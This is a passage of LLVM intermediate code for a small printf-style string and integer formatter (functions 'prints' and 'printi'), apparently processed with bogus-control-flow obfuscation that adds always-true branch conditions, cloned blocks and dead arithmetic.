  %659 = call i32 @printi(i8** %229, i32 %656, i32 10, i32 1, i32 %657, i32 %658, i32 97)
  %660 = load i32, i32* %9, align 4
  %_ = shl i32 %660, %659
  %_31 = sub i32 %660, %659
  %gen = mul i32 %_31, %659
  %_32 = shl i32 %660, %659
  %_33 = sub i32 %660, %659
  %gen34 = mul i32 %_33, %659
  %_35 = shl i32 %660, %659
  %661 = add nsw i32 %660, %659
  store i32 %661, i32* %9, align 4
  br label %originalBB30

originalBB39alteredBB:                            ; preds = %originalBB39, %310
  %662 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 2
  %663 = load i8*, i8** %662, align 8
  %664 = bitcast i8* %663 to i32*
  %665 = getelementptr i8, i8* %663, i32 8
  store i8* %665, i8** %662, align 8
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %331
  %666 = load i32, i32* %332, align 4
  %667 = load i32, i32* %7, align 4
  %668 = load i32, i32* %8, align 4
  %669 = call i32 @printi(i8** %299, i32 %666, i32 16, i32 0, i32 %667, i32 %668, i32 97)
  %670 = load i32, i32* %9, align 4
  %_44 = shl i32 %670, %669
  %_45 = shl i32 %670, %669
  %_46 = sub i32 %670, %669
  %gen47 = mul i32 %_46, %669
  %_48 = shl i32 %670, %669
  %_49 = sub i32 0, %670
  %gen50 = add i32 %_49, %669
  %_51 = sub i32 0, %670
  %gen52 = add i32 %_51, %669
  %671 = add nsw i32 %670, %669
  store i32 %671, i32* %9, align 4
  br label %originalBB43

originalBB56alteredBB:                            ; preds = %originalBB56, %355
  %672 = load i8*, i8** %5, align 8
  %673 = load i8, i8* %672, align 1
  %674 = zext i8 %673 to i32
  %675 = icmp eq i32 %674, 88
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %376
  %676 = load i8**, i8*** %4, align 8
  %677 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %678 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 8
  %680 = icmp ule i32 %679, 40
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %398
  %681 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 3
  %682 = load i8*, i8** %681, align 8
  %683 = getelementptr i8, i8* %682, i32 %388
  %684 = bitcast i8* %683 to i32*
  %_65 = sub i32 %388, 8
  %gen66 = mul i32 %_65, 8
  %_67 = shl i32 %388, 8
  %685 = add i32 %388, 8
  store i32 %685, i32* %387, align 8
  br label %originalBB64

originalBB71alteredBB:                            ; preds = %originalBB71, %420
  %686 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 2
  %687 = load i8*, i8** %686, align 8
  %688 = bitcast i8* %687 to i32*
  %689 = getelementptr i8, i8* %687, i32 8
  store i8* %689, i8** %686, align 8
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %449
  %690 = load i8*, i8** %5, align 8
  %691 = load i8, i8* %690, align 1
  %692 = zext i8 %691 to i32
  %693 = icmp eq i32 %692, 117
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %476
  %694 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 3
  %695 = load i8*, i8** %694, align 8
  %696 = getelementptr i8, i8* %695, i32 %474
  %697 = bitcast i8* %696 to i32*
  %_80 = shl i32 %474, 8
  %_81 = sub i32 0, %474
  %gen82 = add i32 %_81, 8
  %698 = add i32 %474, 8
  store i32 %698, i32* %473, align 8
  br label %originalBB79

originalBB86alteredBB:                            ; preds = %originalBB86, %503
  %699 = load i32, i32* %504, align 4
  %700 = load i32, i32* %7, align 4
  %701 = load i32, i32* %8, align 4
  %702 = call i32 @printi(i8** %471, i32 %699, i32 10, i32 0, i32 %700, i32 %701, i32 97)
  %703 = load i32, i32* %9, align 4
  %_87 = sub i32 0, %703
  %gen88 = add i32 %_87, %702
  %704 = add nsw i32 %703, %702
  store i32 %704, i32* %9, align 4
  br label %originalBB86

originalBB92alteredBB:                            ; preds = %originalBB92, %527
  %705 = load i8*, i8** %5, align 8
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 99
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %578
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %609
  %709 = load i8**, i8*** %4, align 8
  %710 = load i8*, i8** %709, align 8
  store i8 0, i8* %710, align 1
  br label %originalBB100
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* @x.9
  %17 = load i32, i32* @y.10
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %11, align 4
  %24 = load i8*, i8** %6, align 8
  store i8* %24, i8** %12, align 8
  %25 = load i32, i32* @x.9
  %26 = load i32, i32* @y.10
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %40, %originalBBpart2
  %34 = load i8*, i8** %12, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %43

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %11, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %11, align 4
  br label %40

; <label>:40:                                     ; preds = %37
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %33

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 0, i32* %7, align 4
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* @x.9
  %66 = load i32, i32* @y.10
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i32, i32* %11, align 4
  %74 = load i32, i32* %7, align 4
  %75 = sub nsw i32 %74, %73
  store i32 %75, i32* %7, align 4
  %76 = load i32, i32* @x.9
  %77 = load i32, i32* @y.10
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart210, %originalBBpart24
  %85 = load i32, i32* %8, align 4
  %86 = and i32 %85, 2
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %84
  store i32 48, i32* %10, align 4
  br label %89

; <label>:89:                                     ; preds = %88, %84
  %90 = load i32, i32* @x.9
  %91 = load i32, i32* @y.10
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %89
  %98 = load i32, i32* @x.9
  %99 = load i32, i32* @y.10
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %106

; <label>:106:                                    ; preds = %originalBBpart214, %4
  %107 = load i32, i32* %8, align 4
  %108 = and i32 %107, 1
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %123, label %110

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %119, %110
  %112 = load i32, i32* %7, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %111
  %115 = load i8**, i8*** %5, align 8
  %116 = load i32, i32* %10, align 4
  call void @printchar(i8** %115, i32 %116)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %9, align 4
  br label %119

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %7, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %7, align 4
  br label %111

; <label>:122:                                    ; preds = %111
  br label %123

; <label>:123:                                    ; preds = %122, %106
  br label %124

; <label>:124:                                    ; preds = %135, %123
  %125 = load i8*, i8** %6, align 8
  %126 = load i8, i8* %125, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %138

; <label>:128:                                    ; preds = %124
  %129 = load i8**, i8*** %5, align 8
  %130 = load i8*, i8** %6, align 8
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  call void @printchar(i8** %129, i32 %132)
  %133 = load i32, i32* %9, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %9, align 4
  br label %135

; <label>:135:                                    ; preds = %128
  %136 = load i8*, i8** %6, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %6, align 8
  br label %124

; <label>:138:                                    ; preds = %124
  br label %139

; <label>:139:                                    ; preds = %originalBBpart229, %138
  %140 = load i32, i32* @x.9
  %141 = load i32, i32* @y.10
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %139
  %148 = load i32, i32* %7, align 4
  %149 = icmp sgt i32 %148, 0
  %150 = load i32, i32* @x.9
  %151 = load i32, i32* @y.10
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %149, label %158, label %182

; <label>:158:                                    ; preds = %originalBBpart218
  %159 = load i8**, i8*** %5, align 8
  %160 = load i32, i32* %10, align 4
  call void @printchar(i8** %159, i32 %160)
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %163

; <label>:163:                                    ; preds = %158
  %164 = load i32, i32* @x.9
  %165 = load i32, i32* @y.10
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %163
  %172 = load i32, i32* %7, align 4
  %173 = add nsw i32 %172, -1
  store i32 %173, i32* %7, align 4
  %174 = load i32, i32* @x.9
  %175 = load i32, i32* @y.10
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart229, label %originalBB20alteredBB

originalBBpart229:                                ; preds = %originalBB20
  br label %139

; <label>:182:                                    ; preds = %originalBBpart218
  %183 = load i32, i32* %9, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %11, align 4
  %184 = load i8*, i8** %6, align 8
  store i8* %184, i8** %12, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 0, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %185 = load i32, i32* %11, align 4
  %186 = load i32, i32* %7, align 4
  %_ = shl i32 %186, %185
  %_7 = shl i32 %186, %185
  %_8 = sub i32 %186, %185
  %gen = mul i32 %_8, %185
  %187 = sub nsw i32 %186, %185
  store i32 %187, i32* %7, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %89
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %139
  %188 = load i32, i32* %7, align 4
  %189 = icmp sgt i32 %188, 0
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %163
  %190 = load i32, i32* %7, align 4
  %_21 = sub i32 0, %190
  %gen22 = add i32 %_21, -1
  %_23 = shl i32 %190, -1
  %_24 = sub i32 %190, -1
  %gen25 = mul i32 %_24, -1
  %_26 = shl i32 %190, -1
  %_27 = shl i32 %190, -1
  %191 = add nsw i32 %190, -1
  store i32 %191, i32* %7, align 4
  br label %originalBB20
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.11
  %9 = load i32, i32* @y.12
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.11
  %34 = load i32, i32* @y.12
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %65

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.11
  %43 = load i32, i32* @y.12
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %50, align 1
  %51 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %51, align 1
  %52 = load i8**, i8*** %17, align 8
  %53 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %22, align 4
  %56 = call i32 @prints(i8** %52, i8* %53, i32 %54, i32 %55)
  store i32 %56, i32* %16, align 4
  %57 = load i32, i32* @x.11
  %58 = load i32, i32* @y.12
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %246

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.11
  %67 = load i32, i32* @y.12
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = load i32, i32* %20, align 4
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.11
  %77 = load i32, i32* @y.12
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %125

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i32, i32* %19, align 4
  %86 = icmp eq i32 %85, 10
  br i1 %86, label %87, label %125

; <label>:87:                                     ; preds = %84
  %88 = load i32, i32* @x.11
  %89 = load i32, i32* @y.12
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %87
  %96 = load i32, i32* %18, align 4
  %97 = icmp slt i32 %96, 0
  %98 = load i32, i32* @x.11
  %99 = load i32, i32* @y.12
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %97, label %106, label %125

; <label>:106:                                    ; preds = %originalBBpart212
  %107 = load i32, i32* @x.11
  %108 = load i32, i32* @y.12
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  store i32 1, i32* %27, align 4
  %115 = load i32, i32* %18, align 4
  %116 = sub nsw i32 0, %115
  store i32 %116, i32* %29, align 4
  %117 = load i32, i32* @x.11
  %118 = load i32, i32* @y.12
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart220, label %originalBB14alteredBB

originalBBpart220:                                ; preds = %originalBB14
  br label %125

; <label>:125:                                    ; preds = %originalBBpart220, %originalBBpart212, %84, %originalBBpart28
  %126 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %127 = getelementptr inbounds i8, i8* %126, i64 12
  %128 = getelementptr inbounds i8, i8* %127, i64 -1
  store i8* %128, i8** %25, align 8
  %129 = load i8*, i8** %25, align 8
  store i8 0, i8* %129, align 1
  br label %130

; <label>:130:                                    ; preds = %originalBBpart234, %125
  %131 = load i32, i32* %29, align 4
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %133, label %170

; <label>:133:                                    ; preds = %130
  %134 = load i32, i32* %29, align 4
  %135 = load i32, i32* %19, align 4
  %136 = urem i32 %134, %135
  store i32 %136, i32* %26, align 4
  %137 = load i32, i32* %26, align 4
  %138 = icmp sge i32 %137, 10
  br i1 %138, label %139, label %145

; <label>:139:                                    ; preds = %133
  %140 = load i32, i32* %23, align 4
  %141 = sub nsw i32 %140, 48
  %142 = sub nsw i32 %141, 10
  %143 = load i32, i32* %26, align 4
  %144 = add nsw i32 %143, %142
  store i32 %144, i32* %26, align 4
  br label %145

; <label>:145:                                    ; preds = %139, %133
  %146 = load i32, i32* @x.11
  %147 = load i32, i32* @y.12
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %145
  %154 = load i32, i32* %26, align 4
  %155 = add nsw i32 %154, 48
  %156 = trunc i32 %155 to i8
  %157 = load i8*, i8** %25, align 8
  %158 = getelementptr inbounds i8, i8* %157, i32 -1
  store i8* %158, i8** %25, align 8
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %19, align 4
  %160 = load i32, i32* %29, align 4
  %161 = udiv i32 %160, %159
  store i32 %161, i32* %29, align 4
  %162 = load i32, i32* @x.11
  %163 = load i32, i32* @y.12
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart234, label %originalBB22alteredBB

originalBBpart234:                                ; preds = %originalBB22
  br label %130

; <label>:170:                                    ; preds = %130
  %171 = load i32, i32* %27, align 4
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %173, label %238

; <label>:173:                                    ; preds = %170
  %174 = load i32, i32* @x.11
  %175 = load i32, i32* @y.12
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %173
  %182 = load i32, i32* %21, align 4
  %183 = icmp ne i32 %182, 0
  %184 = load i32, i32* @x.11
  %185 = load i32, i32* @y.12
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %183, label %192, label %218

; <label>:192:                                    ; preds = %originalBBpart238
  %193 = load i32, i32* %22, align 4
  %194 = and i32 %193, 2
  %195 = icmp ne i32 %194, 0
  br i1 %195, label %196, label %218

; <label>:196:                                    ; preds = %192
  %197 = load i32, i32* @x.11
  %198 = load i32, i32* @y.12
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %196
  %205 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %205, i32 45)
  %206 = load i32, i32* %28, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %28, align 4
  %208 = load i32, i32* %21, align 4
  %209 = add nsw i32 %208, -1
  store i32 %209, i32* %21, align 4
  %210 = load i32, i32* @x.11
  %211 = load i32, i32* @y.12
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart247, label %originalBB40alteredBB

originalBBpart247:                                ; preds = %originalBB40
  br label %237

; <label>:218:                                    ; preds = %192, %originalBBpart238
  %219 = load i32, i32* @x.11
  %220 = load i32, i32* @y.12
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %218
  %227 = load i8*, i8** %25, align 8
  %228 = getelementptr inbounds i8, i8* %227, i32 -1
  store i8* %228, i8** %25, align 8
  store i8 45, i8* %228, align 1
  %229 = load i32, i32* @x.11
  %230 = load i32, i32* @y.12
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %237

; <label>:237:                                    ; preds = %originalBBpart251, %originalBBpart247
  br label %238

; <label>:238:                                    ; preds = %237, %170
  %239 = load i32, i32* %28, align 4
  %240 = load i8**, i8*** %17, align 8
  %241 = load i8*, i8** %25, align 8
  %242 = load i32, i32* %21, align 4
  %243 = load i32, i32* %22, align 4
  %244 = call i32 @prints(i8** %240, i8* %241, i32 %242, i32 %243)
  %245 = add nsw i32 %239, %244
  store i32 %245, i32* %16, align 4
  br label %246

; <label>:246:                                    ; preds = %238, %originalBBpart24
  %247 = load i32, i32* %16, align 4
  ret i32 %247

originalBBalteredBB:                              ; preds = %originalBB, %7
  %248 = alloca i32, align 4
  %249 = alloca i8**, align 8
  %250 = alloca i32, align 4
  %251 = alloca i32, align 4
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i32, align 4
  %255 = alloca i32, align 4
  %256 = alloca [12 x i8], align 1
  %257 = alloca i8*, align 8
  %258 = alloca i32, align 4
  %259 = alloca i32, align 4
  %260 = alloca i32, align 4
  %261 = alloca i32, align 4
  store i8** %0, i8*** %249, align 8
  store i32 %1, i32* %250, align 4
  store i32 %2, i32* %251, align 4
  store i32 %3, i32* %252, align 4
  store i32 %4, i32* %253, align 4
  store i32 %5, i32* %254, align 4
  store i32 %6, i32* %255, align 4
  store i32 0, i32* %259, align 4
  store i32 0, i32* %260, align 4
  %262 = load i32, i32* %250, align 4
  store i32 %262, i32* %261, align 4
  %263 = load i32, i32* %250, align 4
  %264 = icmp eq i32 %263, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %265 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %265, align 1
  %266 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %266, align 1
  %267 = load i8**, i8*** %17, align 8
  %268 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %269 = load i32, i32* %21, align 4
  %270 = load i32, i32* %22, align 4
  %271 = call i32 @prints(i8** %267, i8* %268, i32 %269, i32 %270)
  store i32 %271, i32* %16, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %272 = load i32, i32* %20, align 4
  %273 = icmp ne i32 %272, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %87
  %274 = load i32, i32* %18, align 4
  %275 = icmp slt i32 %274, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  store i32 1, i32* %27, align 4
  %276 = load i32, i32* %18, align 4
  %_ = shl i32 0, %276
  %_15 = sub i32 0, %276
  %gen = mul i32 %_15, %276
  %_16 = sub i32 0, 0
  %gen17 = add i32 %_16, %276
  %_18 = shl i32 0, %276
  %277 = sub nsw i32 0, %276
  store i32 %277, i32* %29, align 4
  br label %originalBB14

originalBB22alteredBB:                            ; preds = %originalBB22, %145
  %278 = load i32, i32* %26, align 4
  %_23 = shl i32 %278, 48
